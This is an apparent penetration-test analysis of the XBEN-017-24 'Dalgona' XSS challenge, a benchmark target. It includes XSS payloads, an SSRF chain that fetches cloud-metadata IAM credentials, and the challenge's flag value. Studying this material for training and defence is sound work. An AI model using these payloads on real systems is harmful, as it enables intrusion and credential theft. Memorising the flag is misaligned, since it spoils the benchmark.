# Penetration Test Scope & Boundaries

**Primary Directive:** This analysis is strictly limited to the **network-accessible attack surface** of the application. All findings reported here meet the "In-Scope" criteria.

## In-Scope: Network-Reachable Components
A component is considered **in-scope** if its execution can be initiated, directly or indirectly, by a network request that the deployed application server is capable of receiving. This includes:
- Publicly exposed web pages and API endpoints.
- Endpoints requiring authentication via the application's standard login mechanisms.
- Any developer utility, debug console, or script that has been mistakenly exposed through a route or is otherwise callable from other in-scope, network-reachable code.

## Out-of-Scope: Locally Executable Only
A component is **out-of-scope** if it **cannot** be invoked through the running application's network interface and requires an execution context completely external to the application's request-response cycle. This includes tools that must be run via:
- A command-line interface (e.g., `go run ./cmd/...`, `python scripts/...`).
- A development environment's internal tooling (e.g., a "run script" button in an IDE).
- CI/CD pipeline scripts or build tools (e.g., Dagger build definitions).
- Database migration scripts, backup tools, or maintenance utilities.
- Local development servers, test harnesses, or debugging utilities.
- Static files or scripts that require manual opening in a browser (not served by the application).

---

## 1. Executive Summary

The XBEN-017-24 "Dalgona Challenges" application is a deliberately vulnerable Flask-based XSS training platform designed for CTF competitions. This minimal 328-line application presents a **CRITICAL security posture** with multiple high-severity vulnerabilities intentionally exposed for educational purposes. The application runs on an end-of-life Python 2.7.18 stack with Flask 1.1.4 and the abandoned PhantomJS 2.1.1 browser automation tool, exposing two primary network-accessible endpoints without any authentication, authorization, or session management controls.

From an external attacker perspective, the application's attack surface is concentrated in the `/page` endpoint, which exhibits both reflected XSS and server-side request forgery (SSRF) vulnerabilities. The XSS vulnerability stems from insufficient input filtering (only removing literal "XSS" strings) combined with direct HTML attribute injection, allowing trivial exploitation via multiple bypass techniques. More critically, the SSRF vulnerability enables unauthenticated attackers to leverage the PhantomJS headless browser to make arbitrary server-side HTTP requests, potentially accessing cloud metadata services (169.254.169.254), internal network resources, and sensitive IAM credentials. The application also suffers from severe secrets management deficiencies, including plaintext flag storage in version-controlled `.env` files, disabled SSL/TLS configuration, and production-enabled debug mode that exposes interactive debugging interfaces.

While this security posture is catastrophic for production environments, it aligns with the application's stated purpose as a security training challenge. However, the combination of outdated dependencies (Python 2.7 EOL since January 2020, PhantomJS abandoned since March 2018) and the absence of network segmentation or egress filtering creates substantial risks if this application were deployed outside isolated training environments. The SSRF vulnerability in particular represents a scope-changing threat, as successful exploitation could pivot from compromising the challenge application to gaining broader infrastructure access through cloud metadata services or internal API endpoints.

## 2. Architecture & Technology Stack

The Dalgona Challenges application implements a minimalist monolithic architecture built entirely within a single Flask web server. The codebase comprises only 328 total lines across three primary Python modules: the main application (`app.py` with 75 lines of business logic), template constants (`constants.py` with 206 lines of HTML templates), and a PhantomJS validation script (`check.js` with 49 lines). This extremely simple architecture lacks database persistence, background job processing, or multi-tier service decomposition, operating as a pure stateless web application with ephemeral filesystem-based state management.

From a trust boundary perspective, the architecture exhibits a complete absence of security perimeters. There are no authentication gates, authorization layers, or tenant isolation mechanisms. All network-accessible endpoints are publicly exposed without credential requirements, treating all incoming HTTP requests as equally trusted (or rather, equally untrusted). The only component boundary exists between the Flask web server process and the PhantomJS subprocess, but this boundary is deliberately permeable—user-controlled input flows directly from HTTP query parameters through minimal regex filtering into PhantomJS navigation commands. This architectural decision creates a critical attack path where external attackers can leverage the server's internal request capabilities to access resources beyond the application's intended scope.

The technology stack reveals multiple security-critical dependencies in end-of-life or abandoned states. Python 2.7.18, which reached end-of-life in January 2020, powers the Flask 1.1.4 web framework and Werkzeug 1.0.1 WSGI toolkit. PhantomJS 2.1.1, officially abandoned in March 2018, serves as the headless browser for XSS validation. The application runs on Debian Buster with archived package repositories, indicating no active security patching pipeline. Key security components that are present include a single weak regex filter (`re.sub(r"""["']XSS["']""", "", msg)`) that provides negligible protection, subprocess timeout enforcement (5 seconds) preventing denial-of-service through hung processes, and temporary file cleanup using `os.urandom(16)` for cryptographically secure filename generation. However, critical security controls are entirely absent: no Content Security Policy headers, no X-Frame-Options protection, no HTTPS/TLS configuration (explicitly disabled via `ENV OPENSSL_CONF=/dev/null` in the Dockerfile), no rate limiting or DDoS mitigation, no CSRF token validation, and no input validation framework beyond the trivially-bypassable XSS filter.

**Security Implications of Stack Choices:**
- **Python 2.7 EOL:** No security patches for 5+ years, exposing known CVEs in core libraries
- **PhantomJS Abandonment:** 72+ known CVEs since 2018 with no remediation path
- **Debug Mode Enabled:** Flask debug mode exposes Werkzeug interactive debugger, allowing arbitrary code execution if an exception is triggered
- **No Security Headers:** Missing CSP, HSTS, X-Content-Type-Options leaves browsers vulnerable to content sniffing and injection attacks

## 3. Authentication & Authorization Deep Dive

The XBEN-017-24 application implements **zero authentication or authorization controls**, operating as a fully anonymous public web service. This architectural decision is intentional for CTF challenge purposes but represents a complete absence of identity management, access control, or privilege separation. There are no login endpoints, no password validation routines, no user account databases, and no credential verification logic anywhere in the codebase. The application treats all HTTP requests as equally privileged, with no distinction between administrative actions and public resource access.

**Complete API Endpoint Inventory for Authentication:**
The application exposes precisely **TWO network-accessible routes**, neither of which implements any form of authentication:

1. **`GET /` (Index/Landing Page)**
   - **File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-017-24/src/app.py:29-31`
   - **Authentication:** None (publicly accessible)
   - **Function:** Returns static HTML welcome page with challenge instructions
   - **Code:**
     ```python
     @app.route('/')
     def index():
         return Response(constants.INDEX)
     ```

2. **`GET /page` (XSS Challenge Endpoint)**
   - **File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-017-24/src/app.py:63-71`
   - **Authentication:** None (publicly accessible)
   - **Function:** Reflects user input into HTML page, validates XSS via PhantomJS, returns flag on success
   - **Parameters:** `name` (query parameter, no validation)
   - **Code:**
     ```python
     @app.route('/page')
     def page():
         msg = request.args.get('name','')
         msg = re.sub(r"""["']XSS["']""", "", msg, flags=re.IGNORECASE)
         value = "" if msg == "" else 'value="{0}"'.format(msg)
         # ... PhantomJS validation and response logic
     ```

**Session Management Analysis:**
Session management is entirely non-existent. The application does not configure Flask's session handling capabilities, does not set a `SECRET_KEY` (required for cryptographically signed session cookies), and never invokes `session[]` operations. The only Flask configuration present is `PROPAGATE_EXCEPTIONS = True` at line 24-25 of `app.py`, which relates to error handling rather than security controls.

**Session Cookie Flags Configuration:**
Since no cookies are set by the application, there are no cookie security flags configured. The application imports `make_response` from Flask at line 3 (`from flask import Flask, request, Response, make_response, url_for`) but this function is never invoked in the codebase. Therefore:
- **HttpOnly Flag:** NOT CONFIGURED (no cookies exist)
- **Secure Flag:** NOT CONFIGURED (no cookies exist)
- **SameSite Flag:** NOT CONFIGURED (no cookies exist)
- **Location:** N/A - No cookie configuration exists anywhere in the codebase

**Authorization Model:**
There is no authorization model, no role-based access control (RBAC), no permission validation logic, and no resource ownership checks. All endpoints are equally accessible to all network clients. The application does not implement any form of:
- Role assignment or checking
- Permission decorators/middleware
- Admin vs. user privilege separation
- Resource-level access controls
- Tenant isolation or multi-tenancy security

**SSO/OAuth/OIDC Flows:**
The application does not integrate with any external identity providers. There are no OAuth callback endpoints, no OIDC discovery implementations, no SAML handlers, no JWT validation routines, and no state/nonce parameter validation. The codebase contains zero references to OAuth libraries (like `requests-oauthlib`, `authlib`, or `python-social-auth`), no JWT handling (no `PyJWT` or `python-jose` imports), and no SSO configuration.

**Security Implications:**
The complete absence of authentication creates a wide-open attack surface where any network-accessible client can invoke the XSS challenge endpoint repeatedly without rate limiting, brute-force XSS bypasses without account lockout, trigger the SSRF vulnerability to scan internal networks, and access the flag without solving the intended challenge if they can exploit other vulnerabilities. The lack of session management means the application cannot track user actions, implement request throttling per user, or distinguish between legitimate challenge attempts and automated attacks. This anonymous access model is acceptable only in fully isolated CTF environments with network-level access controls preventing broader infrastructure compromise.

## 4. Data Security & Storage

The Dalgona Challenges application exhibits **critical deficiencies in data security controls** across encryption, secrets management, and sensitive data handling. While the application's minimal functionality results in limited data processing (no user accounts, no PII, no payment information), the handling of the CTF flag secret reveals fundamental security failures that would be catastrophic in production environments.

**Database Security:**
The application implements **no database layer whatsoever**. There are no SQL or NoSQL database connections, no ORM configurations (no SQLAlchemy, Django ORM, or MongoDB clients), and no persistent data storage beyond filesystem operations. The only data persistence mechanism is the plaintext `secret.txt` file containing the CTF flag. This absence of database infrastructure eliminates entire vulnerability classes (SQL injection, NoSQL injection, database credential exposure) but concentrates all secrets into a single unprotected file.

**Secrets Management - CRITICAL VULNERABILITIES:**

1. **Secrets in Version Control** (CRITICAL - CVSS 9.8)
   - **File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-017-24/.env:1`
   - **Content:** `FLAG=flag{150348df-0912-4c0b-b000-65a0a48bf14a}`
   - **Vulnerability:** The flag is committed directly to the Git repository in a `.env` file with no `.gitignore` exclusion
   - **Impact:** Anyone with read access to the repository (including historical commits) can retrieve the flag without executing any exploits
   - **Attack Vector:** Clone repository, run `cat .env` or `git log -p .env`

2. **Plaintext Secret Storage** (CRITICAL)
   - **File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-017-24/src/secret.txt:1`
   - **Loading Code:** `app.py:22` - `flags = open('secret.txt').read().split()`
   - **Vulnerability:** Flag stored in plaintext filesystem with no encryption at rest
   - **Storage Flow:** Docker build → `sed` command → plaintext file → Python memory → HTTP response
   - **Missing Controls:** No encryption libraries imported, no use of `cryptography.fernet`, no key derivation functions
   - **Code Example:**
     ```python
     # Line 22 - No error handling, no decryption, no access controls
     flags = open('secret.txt').read().split()
     ```

3. **Secrets in Application Logs** (HIGH)
   - **File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-017-24/src/app.py:41-47`
   - **Code:**
     ```python
     print "Page:"
     print page  # Outputs full HTML page including potential flag disclosure
     print "===================="
     ```
   - **Vulnerability:** Debug `print()` statements output user-generated HTML to stdout, which may contain the flag when XSS challenge is solved
   - **Impact:** Flags appear in Docker logs, CloudWatch Logs, or any centralized logging system without redaction

4. **Insecure Dockerfile Secret Handling**
   - **File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-017-24/Dockerfile:21-23`
   - **Code:**
     ```dockerfile
     ARG FLAG
     WORKDIR /app/src
     RUN sed -i "s/REPLACEME/$FLAG/" secret.txt
     ```
   - **Vulnerability:** Docker build ARG is recorded in image metadata, visible via `docker history` command
   - **Impact:** Flag persists in all image layers, visible to anyone with access to the container image

**Data Flow Security:**
The application implements a single sensitive data flow for the CTF flag:

```
.env file (git tracked) 
  → Docker build ARG 
    → sed command writes to secret.txt 
      → Python reads at startup (app.py:22) 
        → Stored in global 'flags' variable 
          → Returned in HTTP response when XSS challenge solved 
            → Potentially logged to stdout (app.py:41-47)
```

Every stage in this flow uses **plaintext with zero encryption**. There is no encryption at rest (no filesystem encryption, no encrypted volumes), no encryption in transit (HTTP only, TLS explicitly disabled via `ENV OPENSSL_CONF=/dev/null` in Dockerfile), and no encryption in memory (plaintext Python string variable). The application never imports cryptographic libraries (`cryptography`, `pycrypto`, `hashlib` for non-trivial purposes) and implements no key management, key rotation, or secure deletion of sensitive data.

**Cryptography Assessment:**
The application uses precisely **one cryptographic function**:
- **`os.urandom(16)`** at `app.py:35` for temporary filename generation
- **Purpose:** Generate 128-bit random hex string for unique HTML filenames
- **Assessment:** ✅ Cryptographically secure PRNG, appropriate for this use case
- **Code:** `fn = "static/" + os.urandom(16).encode('hex') + '.html'`

**Missing cryptography implementations:**
- No password hashing (bcrypt, scrypt, Argon2) - not applicable, no authentication exists
- No data encryption (AES, ChaCha20)
- No TLS/SSL configuration
- No digital signatures
- No HMAC for data integrity
- No secure key storage (HashiCorp Vault, AWS Secrets Manager, Azure Key Vault)

**Multi-tenant Data Isolation:**
Not applicable - the application is single-tenant by design with no user account separation. However, if multiple instances are deployed for different CTF teams, there is zero isolation between instances sharing the same Docker host or Kubernetes namespace, as the application binds to `0.0.0.0:34545` without namespace restrictions.

**Compliance-Relevant Findings:**
- **GDPR:** Not applicable (no personal data processing)
- **PCI-DSS:** Not applicable (no payment card data)
- **SOC 2 / ISO 27001:** Would fail all encryption, access control, and secrets management controls
- **NIST 800-53:** Fails SC-12 (cryptographic key establishment), SC-13 (cryptographic protection), SC-28 (protection of information at rest)

**Impact Summary:**
The secrets management failures represent the application's most severe security deficiency. An attacker with repository access can retrieve the flag without exploitation. An attacker with container image access can extract the flag from Docker history. An attacker with log access can retrieve the flag from debug output. These attack paths completely bypass the intended XSS challenge, fundamentally undermining the application's purpose as a security training tool.

## 5. Attack Surface Analysis

The XBEN-017-24 application exposes a minimal but highly vulnerable network attack surface consisting of **three network-accessible entry points**. All endpoints are publicly exposed without authentication requirements, running on HTTP (no TLS) at `http://localhost:34545`. The application's Flask debug mode is enabled (`app.run(debug=True)` at line 75), exposing additional attack surface through Werkzeug's interactive debugger interface.

**External Entry Points (Network-Accessible):**

### 1. `GET /` - Index/Landing Page (LOW RISK)
- **File Location:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-017-24/src/app.py:29-31`
- **HTTP Methods:** GET only
- **Authentication Required:** None (public)
- **Input Vectors:** None (static content)
- **Security Analysis:** Returns static HTML from `constants.INDEX` template. No user input processing, no reflection, no dynamic content generation. Safe from injection attacks.
- **Code:**
  ```python
  @app.route('/')
  def index():
      return Response(constants.INDEX)
  ```
- **Potential Attack Vectors:** 
  - Information disclosure through HTML comments or JavaScript (none found)
  - Clickjacking if X-Frame-Options missing (confirmed missing)
- **Trust Boundary:** External internet → Flask routing → Static template response

### 2. `GET /page` - XSS Challenge Endpoint (CRITICAL RISK)
- **File Location:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-017-24/src/app.py:63-71`
- **HTTP Methods:** GET only
- **Authentication Required:** None (public)
- **Input Vectors:** 
  - `name` query parameter (reflected in HTML, passed to PhantomJS)
- **Security Analysis:** This endpoint represents the primary attack surface with dual critical vulnerabilities:

**Vulnerability 1 - Reflected XSS (HTML Attribute Injection):**
```python
# Line 65-67: Insufficient input filtering
msg = request.args.get('name','')
msg = re.sub(r"""["']XSS["']""", "", msg, flags=re.IGNORECASE)  # Removes only ["']XSS["']
value = "" if msg == "" else 'value="{0}"'.format(msg)  # Direct string formatting

# Line 69: Reflected in HTML
page = constants.PAGE_CONTENT.format(..., value, ...)  # {2} replaced with unsanitized input
```

**Attack Examples:**
- `/page?name=" onclick="alert(document.domain)" x="` (breaks out of attribute)
- `/page?name="><script>alert(1)</script><input "` (injects new script tag)
- `/page?name=" onfocus="alert(1)" autofocus="` (auto-triggers event handler)

**Vulnerability 2 - Server-Side Request Forgery (PhantomJS Navigation):**
```python
# Line 34-43: PhantomJS subprocess with user-controlled URL
proc = subprocess.Popen(['/usr/local/bin/phantomjs', '--ssl-protocol=any', ...])
proc.stdin.write(url)  # URL contains user input from 'name' parameter
proc.stdin.close()
```

**SSRF Attack Chain:**
1. Attacker sends: `/page?name=<script>fetch('http://169.254.169.254/latest/meta-data/iam/security-credentials/')</script>`
2. Flask creates HTML with embedded JavaScript
3. PhantomJS navigates to temporary HTML file
4. JavaScript executes server-side in PhantomJS context
5. Server makes request to AWS metadata endpoint
6. IAM credentials returned to attacker

**Additional SSRF Targets:**
- Internal network services: `http://internal-api:8080/admin`
- Localhost services: `http://127.0.0.1:6379` (Redis), `http://127.0.0.1:27017` (MongoDB)
- Cloud metadata: `http://169.254.169.254/` (AWS), `http://metadata.google.internal/` (GCP)

- **Trust Boundaries Crossed:**
  - External internet → Flask web server (untrusted input enters trusted context)
  - Flask process → PhantomJS subprocess (web app privileges escalate to browser automation)
  - PhantomJS → Internal network resources (breaks network segmentation)
  - PhantomJS → Cloud metadata service (access to IAM credentials outside intended scope)

- **Input Validation Patterns:**
  - **Implemented:** Single regex filter removing `["']XSS["']` strings (case-insensitive)
  - **Bypasses:** 
    - Use lowercase without quotes: `<script>alert(1)</script>`
    - Use event handlers: `onclick=`, `onerror=`, `onload=`
    - Encode payloads: `&#x78;ss` (HTML entity encoding)
    - Use alternative sinks: `<svg/onload=...>`, `<img src=x onerror=...>`
  - **Missing Validation:**
    - No HTML entity encoding
    - No JavaScript escaping
    - No URL validation before PhantomJS navigation
    - No CSP headers to restrict script execution
    - No output context-aware sanitization

### 3. `/static/<path:filename>` - Static File Serving (MEDIUM RISK)
- **Source:** Flask default static file handler
- **HTTP Methods:** GET only
- **Authentication Required:** None (public)
- **Input Vectors:** 
  - `filename` path parameter (potential path traversal)
  - Race condition with temporary HTML files
- **Security Analysis:** 
  - Flask serves files from `static/` directory by default
  - Temporary HTML files created at `app.py:35` are stored in `static/` with 16-byte random hex names
  - **Race Condition:** Brief window where attacker could access temporary file before deletion at `app.py:55`
  - **Path Traversal:** Flask's `send_from_directory()` has built-in protections, but check for bypass
- **Code:**
  ```python
  # Line 35: Temporary file in static directory
  fn = "static/" + os.urandom(16).encode('hex') + '.html'
  
  # Line 55: File deleted after PhantomJS validation
  os.remove(fn)
  ```
- **Attack Vector:** Request `/static/<random_filename>.html` during validation window to access user-generated HTML with potential flag disclosure

**Internal Service Communication:**
The application is monolithic with no internal service-to-service communication. The only inter-process boundary is between the Flask parent process and PhantomJS child processes spawned via `subprocess.Popen()`. This boundary is not a trust boundary—the Flask process has full control over PhantomJS execution through stdin/stdout pipes, but the security vulnerability arises from passing **user-controlled data** across this boundary without validation.

**Background Processing:**
The application implements synchronous request processing with subprocess-based validation:

1. User requests `/page?name=<payload>`
2. Flask handler creates temporary HTML file
3. Flask spawns PhantomJS subprocess (inherits Flask process privileges)
4. PhantomJS validates if `alert()`, `confirm()`, or `prompt()` triggered
5. Flask reads PhantomJS stdout/stderr via pipes
6. Flask deletes temporary file
7. Flask returns response (flag or failure message)

**Security Concerns:**
- **Privilege Model:** PhantomJS runs with same user privileges as Flask (typically `root` in Docker containers)
- **Resource Limits:** 5-second timeout prevents DoS, but no concurrency limits (Flask debug server is single-threaded, but production WSGI servers like Gunicorn would allow concurrent subprocess spawning)
- **Subprocess Injection:** While the PhantomJS command uses array-based arguments (safe from shell injection), the **URL passed via stdin** is user-controlled and leads to SSRF

**API Schema Files & Documentation:**
No API schema files were found in the codebase. The application does not use OpenAPI/Swagger specifications, GraphQL schemas, or JSON Schema files. There is no API documentation endpoint like `/api/docs` or `/swagger.json`.

**Attack Surface Summary:**
- **Primary Target:** `/page` endpoint with dual XSS + SSRF vulnerabilities
- **Secondary Target:** `/static/*` race condition for temporary file access
- **Tertiary Target:** Flask debug mode Werkzeug debugger (arbitrary code execution if exception triggered)
- **Defense Evasion:** Weak regex filter trivially bypassed, no CSP headers, no rate limiting
- **Lateral Movement:** SSRF enables pivot to internal network resources and cloud metadata services

## 6. Infrastructure & Operational Security

The XBEN-017-24 application's infrastructure configuration reveals **critical operational security deficiencies** spanning secrets management, TLS configuration, dependency security, and monitoring capabilities. The Docker-based deployment model uses a Debian Buster base image with archived package repositories, indicating no active security patch management pipeline.

**Secrets Management:**

The application implements a fundamentally insecure secrets management strategy with the CTF flag hardcoded across multiple layers:

1. **Environment Variables (Git Tracked):**
   - **File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-017-24/.env:1`
   - **Content:** `FLAG=flag{150348df-0912-4c0b-b000-65a0a48bf14a}`
   - **Vulnerability:** Committed to version control with no `.gitignore` exclusion
   - **Attack Vector:** `git clone` + `cat .env` bypasses all challenge logic

2. **Docker Build Arguments:**
   - **File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-017-24/Dockerfile:21`
   - **Code:** `ARG FLAG`
   - **Vulnerability:** Build-time ARGs persist in Docker image history
   - **Attack Vector:** `docker history <image_id>` exposes flag in image layers

3. **Plaintext File Storage:**
   - **File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-017-24/src/secret.txt`
   - **Creation:** Dockerfile line 23: `RUN sed -i "s/REPLACEME/$FLAG/" secret.txt`
   - **Access:** No filesystem permissions restrictions, readable by Flask process
   - **Missing Controls:** No encryption, no key rotation, no expiration policy

**Secrets Rotation & Access:**
- **Rotation:** Not implemented - flag is static across all deployments
- **Vault Integration:** Not implemented - no HashiCorp Vault, AWS Secrets Manager, or Azure Key Vault
- **Least Privilege:** Not implemented - Flask process has read access to all secrets with no need-to-know enforcement

**Configuration Security:**

1. **Flask Configuration:**
   - **File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-017-24/src/app.py:24-25`
   - **Code:**
     ```python
     app.config['PROPAGATE_EXCEPTIONS'] = True
     # Missing: SECRET_KEY, SESSION_COOKIE_SECURE, SESSION_COOKIE_HTTPONLY
     ```
   - **Vulnerabilities:**
     - No `SECRET_KEY` set (required for session signing)
     - No security headers configured
     - Debug mode enabled on line 75: `app.run(debug=True, host='0.0.0.0', port=34545)`

2. **Docker Configuration:**
   - **File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-017-24/Dockerfile`
   - **Critical Issues:**
     - Line 8: `ENV OPENSSL_CONF=/dev/null` - **Disables TLS/SSL entirely**
     - Line 12: `RUN chmod +x /usr/local/bin/phantomjs` - No AppArmor/SELinux sandboxing
     - Runs as root user (no `USER` directive to drop privileges)
   - **Port Exposure:** `docker-compose.yml` exposes port 34545 to host, binding to `0.0.0.0` (all interfaces)

3. **Environment Separation:**
   - **Development vs Production:** No environment-specific configurations
   - **Configuration Files:** Single `.env` file for all environments (no `.env.production`, `.env.staging`)
   - **Risk:** Debug mode and verbose logging would run in production if deployed

**Security Headers Configuration:**

The application implements **ZERO security headers**. Analysis of response headers (from `app.py` and Dockerfile):

- ❌ **Strict-Transport-Security (HSTS):** Not configured (app runs HTTP only)
- ❌ **Content-Security-Policy (CSP):** Not configured (would prevent XSS exploitation)
- ❌ **X-Frame-Options:** Not configured (vulnerable to clickjacking)
- ❌ **X-Content-Type-Options:** Not configured (vulnerable to MIME sniffing)
- ❌ **X-XSS-Protection:** Not configured (legacy, but still recommended)
- ❌ **Referrer-Policy:** Not configured (potential information disclosure)
- ❌ **Permissions-Policy:** Not configured (no feature restrictions)

**Infrastructure Location for Security Headers:**
Security headers would typically be configured in one of these locations (all currently missing):

1. **Application-Level (Flask):**
   - File: `app.py` after line 25
   - Missing code:
     ```python
     @app.after_request
     def set_security_headers(response):
         response.headers['X-Frame-Options'] = 'DENY'
         response.headers['X-Content-Type-Options'] = 'nosniff'
         response.headers['Content-Security-Policy'] = "default-src 'self'"
         return response
     ```

2. **Reverse Proxy (Nginx/Apache):**
   - Not present in this deployment
   - If added, would configure in `/etc/nginx/nginx.conf` or similar

3. **CDN/WAF (Cloudflare/AWS CloudFront):**
   - Not present - application exposed directly without CDN protection

4. **Kubernetes Ingress:**
   - Not present - Docker Compose deployment only

**Cache-Control Configuration:**
- **Location:** Not configured anywhere
- **Current Behavior:** Browsers may cache responses containing user input or flags
- **Recommended Location:** Flask `@app.after_request` decorator to set `Cache-Control: no-store, no-cache, must-revalidate`

**External Dependencies:**

1. **Python Dependencies:**
   - **File:** No `requirements.txt` found (dependencies managed in Dockerfile)
   - **Critical Dependencies:**
     - `Flask==1.1.4` (outdated, current is 3.0+, last CVE: CVE-2023-30861 - Cookie security)
     - `Werkzeug==1.0.1` (outdated, current is 3.0+, debug mode RCE in old versions)
     - `Python 2.7.18` (EOL January 2020, 300+ known CVEs since EOL)
   - **No Dependency Scanning:** No `safety`, `pip-audit`, or Snyk integration

2. **System Dependencies:**
   - **PhantomJS 2.1.1:** Abandoned project with 72+ known CVEs (no patches since March 2018)
   - **Debian Buster:** Using archived repositories (no active security updates)
   - **No Vulnerability Scanning:** No Trivy, Grype, or Clair scanning in CI/CD

3. **Third-Party Service Integrations:**
   - **None Detected:** No external API calls, no payment processors, no analytics services
   - **Risk:** Low - minimal attack surface from third-party dependencies

**Monitoring & Logging:**

1. **Application Logging:**
   - **Implementation:** Basic `print()` statements (Python 2 style)
   - **File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-017-24/src/app.py:41-47`
   - **Code:**
     ```python
     print "Page:"
     print page
     print "===================="
     ```
   - **Issues:**
     - No structured logging (no JSON format)
     - No log levels (DEBUG/INFO/WARNING/ERROR)
     - No log aggregation (no ELK stack, CloudWatch Logs, or Splunk)
     - Secrets potentially logged (flag may appear in output)

2. **Security Event Logging:**
   - **Authentication Failures:** N/A (no authentication)
   - **Authorization Violations:** N/A (no authorization)
   - **Suspicious Input Patterns:** Not logged
   - **SSRF Attempts:** Not logged (no detection of internal IP access)
   - **Rate Limit Violations:** N/A (no rate limiting)

3. **Access Logging:**
   - **Web Server Logs:** Flask development server has minimal access logging
   - **Audit Trail:** No correlation IDs, no request tracing
   - **Retention:** Not configured (logs to stdout only, lost on container restart)

4. **Alerting:**
   - **Security Alerts:** Not configured
   - **Performance Alerts:** Not configured
   - **Uptime Monitoring:** Not configured

**Operational Security Recommendations:**

**CRITICAL Priority:**
1. Remove `.env` from Git history: `git filter-branch --force --index-filter "git rm --cached --ignore-unmatch .env" --prune-empty --tag-name-filter cat -- --all`
2. Disable TLS suppression: Remove `ENV OPENSSL_CONF=/dev/null`, implement HTTPS
3. Disable Flask debug mode: Change `app.run(debug=False)` in production
4. Implement secret rotation: Migrate to HashiCorp Vault or AWS Secrets Manager

**HIGH Priority:**
5. Add security headers: Implement CSP, HSTS, X-Frame-Options via Flask middleware
6. Drop root privileges: Add `USER appuser` to Dockerfile
7. Replace PhantomJS: Migrate to Puppeteer/Playwright with sandboxing
8. Implement structured logging: Use `logging` module with JSON formatters

**MEDIUM Priority:**
9. Add dependency scanning: Integrate `pip-audit` and Trivy in CI/CD
10. Implement network segmentation: Block egress to 169.254.169.254 and internal networks
11. Add rate limiting: Use Flask-Limiter to prevent abuse
12. Configure cache headers: Prevent caching of dynamic content

## 7. Overall Codebase Indexing

The XBEN-017-24 codebase is exceptionally minimal, consisting of only **328 total lines of code** across three primary files within a flat directory structure. This intentional simplicity serves the application's purpose as a focused CTF challenge, but the lack of architectural patterns and security boundaries creates multiple attack vectors that extend beyond the intended XSS vulnerability.

**Directory Structure and Organization:**

```
/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-017-24/
├── .env                          # CRITICAL: Flag secret in version control
├── docker-compose.yml            # Container orchestration, port exposure
├── Dockerfile                    # Build config with security misconfigurations
└── src/
    ├── app.py                    # Main Flask application (75 LOC)
    ├── constants.py              # HTML templates (206 LOC)
    ├── check.js                  # PhantomJS validation script (49 LOC)
    └── secret.txt                # Plaintext flag storage (created at build time)
```

The codebase adheres to no established framework conventions (no MVC pattern, no blueprints, no modular architecture) and lacks typical enterprise Python project structure elements such as `requirements.txt` for dependency management, `tests/` directory for test coverage, `config/` for environment-specific settings, or `migrations/` for database schema evolution. This flat structure consolidates all HTML templates into a single 206-line `constants.py` file, mixing presentation logic directly with application constants rather than using Jinja2 template files in a separate `templates/` directory.

From a security discoverability perspective, the minimal codebase initially appears advantageous—security reviewers can audit all code in under 30 minutes. However, this simplicity is deceptive. The critical security vulnerabilities are not localized to isolated input validation functions or authentication modules but are instead distributed across the request handling flow from lines 63-71 of `app.py`, through the PhantomJS subprocess spawning logic at lines 34-55, and into the JavaScript validation script `check.js` at line 20. This tight coupling means a single endpoint (`/page`) creates multiple attack surfaces (XSS, SSRF, race conditions on temporary files) without clear security boundary delineation.

**Build System and Tooling:**

The application uses **Docker and Docker Compose** as its sole build and deployment mechanism, with no use of modern Python build tools like Poetry, Pipenv, or setuptools. Dependencies are installed directly in the Dockerfile via `pip install` commands rather than declared in a `requirements.txt` or `pyproject.toml` file, making dependency tracking and CVE scanning significantly more difficult. The build process exhibits several security-relevant characteristics:

1. **Multi-Stage Build Absence:** The Dockerfile uses a single-stage build rather than multi-stage builds that could separate build-time secrets from runtime images
2. **Build-Time Secret Injection:** The flag is injected via `ARG FLAG` and written to `secret.txt` using `sed`, leaving traces in Docker image history
3. **No Build-Time Security Scanning:** The build process lacks integration with tools like Trivy, Grype, or Snyk to detect vulnerable dependencies before deployment
4. **Archived Base Image:** Uses Debian Buster from archived repositories (`deb.debian.org/debian-archive/`), indicating no intention to receive security updates

**Testing Framework Analysis:**

The codebase contains **zero automated tests**—no unit tests, integration tests, or security tests. There is no `tests/` directory, no `pytest` or `unittest` imports, and no CI/CD pipeline configuration files (no `.github/workflows/`, `.gitlab-ci.yml`, or `Jenkinsfile`). This absence is particularly concerning for security validation, as the XSS filter at line 66 (`re.sub(r"""["']XSS["']""", "", msg)`) has no test coverage documenting its intended behavior or bypass prevention logic. Security-focused codebases would typically include test cases demonstrating both valid exploits (proving the challenge is solvable) and invalid attempts (proving unintended bypasses are prevented), but neither category exists here.

**Code Generation and Conventions:**

The application uses no code generation tools, no metaprogramming patterns, and no template engines beyond Python's built-in `.format()` method for string substitution. HTML templates are defined as raw multi-line Python strings in `constants.py` (lines 8-149 for `INDEX`, lines 151-177 for `PAGE_CONTENT`, lines 179-209 for `PAGE_CONTENT_IFRAME`). This approach bypasses Jinja2's auto-escaping protections that would normally prevent XSS vulnerabilities, directly contributing to the exploitability of the intentional XSS challenge.

The codebase follows Python 2.7 conventions (end-of-life since January 2020) with print statements rather than functions (`print "Page:"` at line 41 instead of `print("Page:")`), old-style string formatting (`.format()` and `%s` instead of f-strings), and imports from `__future__` that are unnecessary in Python 3. This legacy syntax choice impacts security tooling compatibility, as many modern static analysis tools (Bandit, Semgrep, PyLint security checkers) have deprecated Python 2.7 support.

**Security Component Discoverability:**

The extreme simplicity of the codebase paradoxically increases the difficulty of discovering security controls, because **no security controls exist to discover**. Security reviewers searching for standard patterns like:
- `@login_required` decorators (no authentication)
- `flask_limiter` rate limiting (not implemented)
- `flask_wtf.csrf` CSRF protection (not implemented)
- `csp_header` Content Security Policy (not implemented)
- `helmet` security headers middleware (not implemented)
- Input validation schemas (Marshmallow, Pydantic) (not implemented)

